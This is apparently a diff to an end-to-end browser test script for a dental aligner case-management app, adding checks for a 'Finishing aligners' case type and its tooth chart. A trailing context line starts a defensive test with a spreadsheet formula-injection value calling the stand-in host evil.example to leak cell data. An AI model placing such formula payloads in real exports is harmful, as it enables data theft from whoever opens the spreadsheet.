@@ -380,6 +380,28 @@ async function openByName(p, name) {
   dump = JSON.stringify(await fsDump());
   check(!dump.includes('Petra') && !dump.includes('Resolve black'), 'tapped details are encrypted too');
 
+  console.log('\n# Finishing aligners (in-house) replaces Reset');
+  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
+  check(!(await owner.isVisible('.tt[data-tile=reset]')), 'no Reset button');
+  await owner.click('#ncForm .tt[data-tile=finishing]'); await owner.fill('#cf-patient', 'Fiona Finisher');
+  check(await owner.inputValue('#cf-detail') === 'Finishing aligners', 'detail reads Finishing aligners');
+  check(await owner.isVisible('#cf-titanUrl'), 'Titan link offered (in-house)');
+  check(await owner.inputValue('#cf-dueDate') === await owner.evaluate(() => addDays(todayISO(), 14)), 'aligner dates fill in');
+  await owner.click('#cf-tc [data-tq=ant]');
+  await owner.click('#cf-tc [data-tool=implant]'); await owner.click('#cf-tc .tooth[data-t=UL6]');
+  await owner.click('#cf-tc [data-tool=noatt]'); await owner.click('#cf-tc .tooth[data-t=LL3]');
+  check(await owner.textContent('#cf-teethSum') === 'No attachment: UR3 to UL3, LR3 to LL2\nImplant: UL6', 'tooth chart: anteriors in one tap, single teeth toggle, summary reads in Palmer');
+  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
+  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=inhouse]');
+  await owner.waitForSelector('section[aria-label="TxP needed"] .kc:has-text("Fiona Finisher")', { timeout: 20000 });
+  check(true, 'lands on the in-house board at TxP needed');
+  await owner.click('.kc:has-text("Fiona Finisher")'); await owner.waitForSelector('#drawer .tc.ro');
+  check(await owner.isVisible('#drawer .txt:has-text("Implant: UL6")') && (await owner.locator('#drawer .tc.ro .tooth.m-noatt').count()) === 11, 'case view shows the chart and its summary');
+  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
+  check((await owner.getAttribute('#drawer .tt[data-tile=finishing]', 'aria-checked')) === 'true', 'editing keeps it as Finishing aligners');
+  check(await owner.isVisible('#drawer .tooth.m-implant[data-t=UL6]'), 'editing restores the tooth chart');
+  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+
   console.log('\n# Spreadsheet-formula text is neutralized in the export');
   await owner.fill('#q', ''); await newCase(owner, { type: 'misc', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });
 
